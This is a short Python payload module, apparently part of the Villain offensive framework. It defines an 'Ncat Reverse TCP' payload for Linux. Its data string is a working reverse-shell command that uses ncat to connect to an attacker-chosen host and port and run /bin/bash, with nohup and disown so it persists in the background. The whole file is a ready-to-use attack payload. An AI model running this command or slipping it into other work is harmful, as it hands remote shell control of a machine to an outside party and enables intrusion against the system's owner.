# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Ncat Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Ncat Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'ncat',
        'os' : 'linux'  
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nohup ncat *LHOST* *LPORT* -e /bin/bash & disown"
